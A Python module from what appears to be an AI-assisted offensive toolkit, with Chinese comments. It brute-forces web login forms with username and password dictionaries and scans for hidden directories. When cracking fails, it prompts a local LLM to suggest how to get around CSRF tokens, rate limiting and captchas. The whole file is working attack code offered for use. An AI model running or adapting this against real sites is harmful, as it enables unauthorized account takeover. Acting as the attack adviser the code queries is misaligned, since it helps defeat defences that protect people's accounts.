"""
暴力破解模块
支持: HTTP Basic/Digest认证、后台登录、目录文件爆破
"""

import os
import requests
import threading
import queue
import time
import re
from modules.ollama_client import ModelClient as OllamaClient
from config import DEFAULT_USER_AGENT, BRUTE_THREADS, BRUTE_TIMEOUT


class BruteForcer:
    """暴力破解器"""

    def __init__(self):
        self.ollama = OllamaClient()
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": DEFAULT_USER_AGENT})
        self.results = []
        self.stop_flag = False

    def brute(self, url, username, password_file, method="POST"):
        """
        执行暴力破解
        :param url: 目标登录URL
        :param username: 用户名(字符串或文件路径)
        :param password_file: 密码字典文件路径
        :param method: HTTP方法 POST/GET
        """
        # 读取用户名列表
        if "\n" in username or os.path.exists(username):
            usernames = self._read_lines(username)
        else:
            usernames = [username]

        # 读取密码字典
        if not os.path.exists(password_file):
            return f"[ERROR] 密码文件不存在: {password_file}"

        passwords = self._read_lines(password_file)
        if not passwords:
            return "[ERROR] 密码字典为空"

        self.results = []
        self.stop_flag = False

        results = []
        results.append(f"[*] 目标: {url}")
        results.append(f"[*] 用户名: {usernames}")
        results.append(f"[*] 密码字典: {password_file} ({len(passwords)} 个密码)")

        # 尝试检测登录参数
        login_params = self._detect_login_params(url)
        if login_params:
            results.append(f"[i] 检测到登录参数: {login_params}")

        # 开始爆破
        found = []
        for user in usernames:
            for pwd in passwords:
                if self.stop_flag:
                    break

                test_result = self._try_login(url, user, pwd, method, login_params)
                if test_result:
                    found.append({"user": user, "pwd": pwd})
                    results.append(f"\n[!] 撞开! 用户名: {user}  密码: {pwd}")

                if len(found) >= 3:  # 找到3个就停
                    self.stop_flag = True
                    break

        if found:
            results.append(f"\n[+] 共撞开 {len(found)} 个账户!")
        else:
            results.append("\n[-] 未找到有效凭据(可能需要手动调整登录参数)")

        # AI建议
        if not found:
            ai_hint = self._ai_hint(url)
            if ai_hint:
                results.append(f"\n[AI调整建议]\n{ai_hint}")

        return "\n".join(results)

    def dir_scan(self, url, wordlist):
        """
        目录/文件扫描
        :param url: 目标URL根地址
        :param wordlist: 目录字典
        """
        if not url.endswith("/"):
            url += "/"

        words = self._read_lines(wordlist)
        if not words:
            return "[ERROR] 字典为空"

        results = []
        results.append(f"[*] 扫描目录: {url}")
        results.append(f"[*] 字典: {wordlist} ({len(words)} 条)")

        found = []
        status_codes = {}

        for word in words:
            target = f"{url}{word}"
            try:
                r = self.session.get(target, timeout=BRUTE_TIMEOUT, allow_redirects=False)
                code = r.status_code
                status_codes[code] = status_codes.get(code, 0) + 1

                if code == 200:
                    found.append(f"[200] {word}")
                elif code == 301 or code == 302:
                    found.append(f"[{code}] {word} -> {r.headers.get('Location', '')}")
                elif code == 403:
                    found.append(f"[403] {word} (Forbidden)")

            except requests.exceptions.Timeout:
                pass
            except Exception:
                pass

        if found:
            results.append(f"\n[+] 发现 {len(found)} 个路径:")
            for f in found[:50]:  # 限制显示
                results.append(f"  {f}")
        else:
            results.append(f"\n[-] 未发现目录(状态码统计: {status_codes})")

        return "\n".join(results)

    def _read_lines(self, path):
        """读取文件每行"""
        if not os.path.exists(path):
            # 可能是单行字符串
            return [path]
        lines = []
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        lines.append(line)
        except Exception:
            return [path]
        return lines

    def _detect_login_params(self, url):
        """尝试检测登录表单参数"""
        try:
            r = self.session.get(url, timeout=10)
            html = r.text

            # 查找表单
            form = re.search(r"<form[^>]*>(.*?)</form>", html, re.DOTALL | re.IGNORECASE)
            if form:
                inputs = re.findall(r"<input[^>]*name=\"([^\"]+)\"[^>]*>", form.group(1), re.IGNORECASE)
                if inputs:
                    return inputs

            # 尝试常见的登录参数
            common_params = ["username", "user", "login", "email", "password", "pass", "pwd"]
            for param in common_params:
                if param in html.lower():
                    return [param]

        except Exception:
            pass
        return None

    def _try_login(self, url, username, password, method, params=None):
        """
        尝试登录
        :return: True如果成功
        """
        # 默认参数
        if params is None:
            params = ["username", "password"]

        data = {}
        if len(params) >= 2:
            data[params[0]] = username
            data[params[1]] = password
        else:
            data["username"] = username
            data["password"] = password

        try:
            if method.upper() == "POST":
                r = self.session.post(url, data=data, timeout=BRUTE_TIMEOUT, allow_redirects=True)
            else:
                r = self.session.get(url, params=data, timeout=BRUTE_TIMEOUT, allow_redirects=True)

            resp_text = r.text.lower()

            # 成功特征
            success_patterns = [
                "welcome", "logout", "sign out", "登录成功",
                "dashboard", "admin", "profile", "success",
            ]

            # 失败特征
            fail_patterns = [
                "incorrect", "invalid", "error", "failed",
                "wrong", "密码错误", "登录失败", "用户名或密码",
            ]

            # 判断
            is_fail = any(p in resp_text for p in fail_patterns)
            is_success = any(p in resp_text for p in success_patterns) and not is_fail

            # 如果响应码是200且内容明显变化，可能是成功的
            if r.status_code == 200 and len(r.text) > 500 and not is_fail:
                # 再检查是否真的失败了
                return not any(p in resp_text for p in fail_patterns[:5])

            return is_success and not is_fail

        except Exception:
            return False

    def _ai_hint(self, url):
        """获取AI建议"""
        try:
            prompt = f"""暴力破解失败，目标是: {url}

请分析可能原因:
1. 登录参数名称是否错误?
2. 是否需要额外的参数(token/csrf)?
3. 是否有限流/验证码?
4. 登录判断逻辑是否特殊?

给出调整建议，每点简洁。
"""
            return self.ollama.generate(prompt)
        except Exception:
            return None


